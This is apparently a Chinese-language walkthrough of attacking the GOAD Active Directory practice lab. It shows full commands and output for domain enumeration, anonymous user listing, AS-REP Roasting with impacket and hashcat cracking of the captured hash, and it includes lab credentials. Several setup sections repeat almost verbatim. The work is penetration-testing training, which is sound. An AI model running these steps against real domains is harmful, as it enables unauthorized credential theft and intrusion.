### 枚举网络

![image-20230830162202922](upload/attach/202309/986394_BF476KR7WHF36CN.jpg)

使用`cme`(`crackmapexec`)扫描 netbios结果.

```
cme smb 192.168.56.1/24
```

获取IP, 主机名称, 所在域, 结果如下:

![image-20230830162732236](upload/attach/202309/986394_VWE7K2GU39BAAQ2.jpg)

发现3个域, 详情如下:

- north.sevenkingdoms.local (2台主机)

- SMB 192.168.56.12 445 MEEREEN [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (**signing:True**) (SMBv1:True)

- sevenkingdoms.local (2台主机)

- SMB 192.168.56.23 445 BRAAVOS [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (**signing:False**) (SMBv1:True)

- SMB 192.168.56.10 445 KINGSLANDING [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (**signing:True**) (SMBv1:False)

存在3个域, 就有三台域控. 微软默认将DC的SMB签名设置为True. (实际环境中可能不存在, 需要其他办法确认域控所在IP)

### 查找域控IP

![image-20230830164621751](upload/attach/202309/986394_A93NUYEQQMFP4G2.jpg)

使用`nslookup` 查询DNS 枚举域控IP

```shell
nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
nslookup -type=srv _ldap._tcp.dc._msdcs.essos.local 192.168.56.10
nslookup -type=srv _ldap._tcp.dc._msdcs.north.sevenkingdoms.local 192.168.56.10
```

![image-20230830165504390](upload/attach/202309/986394_XPM6F9HKWUMGKPE.jpg)

可得以下信息

- north.sevenkingdoms.local

- DC: winterfell.north.sevenkingdoms.local

- DC_IP: 192.168.56.11

- sevenkingdoms.local

- DC: kingslanding.sevenkingdoms.local

- DC_IP: 192.168.56.10

- essos.local

- DC: meereen.essos.local

- DC_IP: 192.168.56.12

### 设置 /etc/hosts 和 kerberos

- 在linux环境下是用kerberos, 需要修改hosts设置和krb5-user服务设置.

- 首先我们通过配置`/etc/hosts`文件来设置DNS

```text
# /etc/hosts
# GOAD
192.168.56.10 sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding
192.168.56.11 winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell
192.168.56.12 essos.local meereen.essos.local meereen
192.168.56.22 castelblack.north.sevenkingdoms.local castelblack
192.168.56.23 braavos.essos.local braavos
```

- 安装 Linux kerberos client

```shell
sudo apt install krb5-user
```

- 安装后界面如下:

![image-20230830170735469](upload/attach/202309/986394_R64J5VDWKQ4NN7Q.jpg)

使用UI配置或者直接修改配置文件:

```shell
vi /etc/krb5.conf
```

```text
[libdefaults]
default_realm = essos.local
kdc_timesync = 1
ccache_type = 4
forwardable = true
proxiable = true
fcc-mit-ticketflags = true
[realms]
north.sevenkingdoms.local = {
kdc = winterfell.north.sevenkingdoms.local
admin_server = winterfell.north.sevenkingdoms.local
}
sevenkingdoms.local = {
kdc = kingslanding.sevenkingdoms.local
admin_server = kingslanding.sevenkingdoms.local
}
essos.local = {
kdc = meereen.essos.local
admin_server = meereen.essos.local
}
```

- 测试一下配置是否生效:

```shell
impacket-getTGT essos.local/khal.drogo:horse # 测试配置 假设知道密码
export KRB5CCNAME=$(pwd)/khal.drogo.ccache # 使用TGT票据
impacket-smbclient -k @braavos.essos.local # smb连接
unset KRB5CCNAME # 取消TGT票据使用
```

![image-20230830171748716](upload/attach/202309/986394_T3PZ4SHXBQ25GEV.jpg)

### nmap 扫描:

```shell
nmap -Pn -p- -sC -sV -oA full_scan_goad 192.168.56.10-12,22-23
```

- 命令解析:

- `-Pn`不做 ping 扫描并扫描所有 ip

- `-p-`默认情况下扫描 65535 个端口，而不是默认的 nmap 1000 个顶级端口

- `-sC`使用默认脚本进行侦察

- `-sV`枚举服务版本

- `-oA`以 3 种可用格式写入结果（nmap classic、grep 格式、xml 格式）

- 完整扫描结果为：

```
...
```

## GOAD第二部分 枚举用户

![image-20230831135955738](upload/attach/202309/986394_ZSHJRPD3EP4S8WV.jpg)

### 匿名枚举DC

#### 使用cme 枚举匿名枚举用户

```shell
cme smb <dc-ip> --users
```

![image-20230831140605874](upload/attach/202309/986394_Z9Q646PGCGVDUYD.jpg)

- 域: north.sevenkingdoms.local DC: 192.168.56.11 (winterfell.north.sevenkingdoms.local) 允许匿名枚举

- 发现用户 samwell.tarly的密码写在注释里了 得到用户: samwell.tarly:Heartsbane

- 域: sevenkingdoms.local DC: 192.168.56.10 (kingslanding.sevenkingdoms.local) 不允许匿名枚举

- 域: essos.local DC: 192.168.56.12 (winterfell.north.sevenkingdoms.local) 不允许匿名枚举

#### 使用cme 查询密码策略:

```shell
cme smb <dc-ip> --pass-pol
```

```shell
rpcclient -U "NORTH\\" 192.168.56.11 -N
```

```shell
net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'
```

### AS-REP Roasting 攻击

- AS-REP Roasting 是一种对用户账号进行离线爆破的攻击方式。但是该攻击方式利用比较局限，因为其需要用户账号设置 "Do not require Kerberos preauthentication（不需要 Kerberos 预身份验证）" 。而该属性默认是没有勾选上的。

```shell
impacket-GetNPUsers -request NORTH.SEVENKINGDOMS.LOCAL/ -no-pass -usersfile NORTH.SEVENKINGDOMS.LOCAL.users
```




- 发现 `brandon.stark` 账户可进行破解


```
ldapsearch -x -D '<USER>@<SUB\_DOMAIN>.<TLD>' -w '' -H 'ldap://<DC\_IP>' -b 'dc=<SUB\_DOMAIN>,dc=<TLD>'
```

### 设置 `/etc/hosts` 和 `kerberos`

- 在linux环境下是用kerberos, 需要修改`hosts`设置和`krb5-user`服务设置.
- 首先我们通过配置`/etc/hosts`文件来设置DNS

```
# /etc/hosts
# GOAD
192.168.56.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding
192.168.56.11   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell
192.168.56.12   essos.local meereen.essos.local meereen
192.168.56.22   castelblack.north.sevenkingdoms.local castelblack
192.168.56.23   braavos.essos.local braavos
```

- 安装 Linux kerberos client

```
sudo apt install krb5-user
```

- 安装后界面如下:

![image-20230830170735469](https://bbs.kanxue.com/upload/attach/202309/986394_R64J5VDWKQ4NN7Q.jpg)

使用UI配置或者直接修改配置文件:

```
vi /etc/krb5.conf
```

```
[libdefaults]
default_realm = essos.local
kdc_timesync = 1
ccache_type = 4
forwardable = true
proxiable = true
fcc-mit-ticketflags = true
[realms]
north.sevenkingdoms.local = {
kdc = winterfell.north.sevenkingdoms.local
admin_server = winterfell.north.sevenkingdoms.local
}
sevenkingdoms.local = {
kdc = kingslanding.sevenkingdoms.local
admin_server = kingslanding.sevenkingdoms.local
}
essos.local = {
kdc = meereen.essos.local
admin_server = meereen.essos.local
}
```

- 测试一下配置是否生效:

```
impacket-getTGT essos.local/khal.drogo:horse   # 测试配置 假设知道密码
export KRB5CCNAME=$(pwd)/khal.drogo.ccache    # 使用TGT票据
impacket-smbclient -k @braavos.essos.local     # smb连接
unset KRB5CCNAME                                # 取消TGT票据使用
```

![image-20230830171748716](https://bbs.kanxue.com/upload/attach/202309/986394_T3PZ4SHXBQ25GEV.jpg)

### nmap 扫描:

```
nmap -Pn -p- -sC -sV -oA full_scan_goad 192.168.56.10-12,22-23
```

- 命令解析:
  - `-Pn` 不做 ping 扫描并扫描所有 ip
  - `-p-` 默认情况下扫描 65535 个端口，而不是默认的 nmap 1000 个顶级端口
  - `-sC` 使用默认脚本进行侦察
  - `-sV` 枚举服务版本
  - `-oA` 以 3 种可用格式写入结果（nmap classic、grep 格式、xml 格式）

- 完整扫描结果为：

```
...
```

### AS-REP Roasting 攻击

- AS-REP Roasting 是一种对用户账号进行离线爆破的攻击方式。但是该攻击方式利用比较局限，因为其需要用户账号设置 "Do not require Kerberos preauthentication(不需要kerberos预身份验证)"。而该属性默认是没有勾选上的。

| 1 | `impacket-GetNPUsers -request NORTH.SEVENKINGDOMS.LOCAL/ -no-pass -usersfile NORTH.SEVENKINGDOMS.LOCAL.users` |



```text
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:3ac56a0c39ead375a2e303495de4668f$
[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robb.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User catelyn.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User eddard.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User vagrant doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- 发现`brandon.stark`账户可进行破解

```bash
hashcat -m 18200 '$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:3ac56a0c39ead375a2e303495de4668f$' /usr/share/wordlists/rockyou.txt
```

![image-20230831202337407](https://bbs.kanxue.com/upload/attach/202309/986394_S2372JEYPURWQ2F.jpg)

获得账号 `brandon.stark:iseedeadpeople`

## GOAD-第三部分 使用用户账号枚举

![image-20230901150432319](https://bbs.kanxue.com/upload/attach/202309/986394_Z4RFVSDQB2KP962.jpg)

按照思维导图, 获取用户密码后 第一件事就是枚举域内完整用户.

```bash
GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
```

![image-20230901151202151](https://bbs.kanxue.com/upload/attach/202309/986394_NE75T8F4R958ACR.jpg)

由于林中存在域名信任, 可以通过LDAP查询其他域信息

```bash
ldapsearch -x -D '<USER>@<SUB_DOMAIN>.<TLD>' -w '<PASSWORD>' -H 'ldap://<DC_IP>' -b 'dc=<SUB_DOMAIN>,dc=<TLD>'
```

查询`north.sevenkingdoms.local`域用户信息

```bash
ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" | grep 'distinguishedName:'
```

![image-20230901151547966](https://bbs.kanxue.com/upload/attach/202309/986394_C5RVK35TAYSHUR9.jpg)

查询`essos.local` 域用户信息

```bash
ldapsearch -H ldap://192.168.56.12 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=essos,DC=local' "(&(objectCategory=person)(objectClass=user))"
```

![image-20230901153652953](https://bbs.kanxue.com/upload/attach/202309/986394_WHMTVS34KFGKEQQ.jpg)

不知道为毛, 查询失败了..
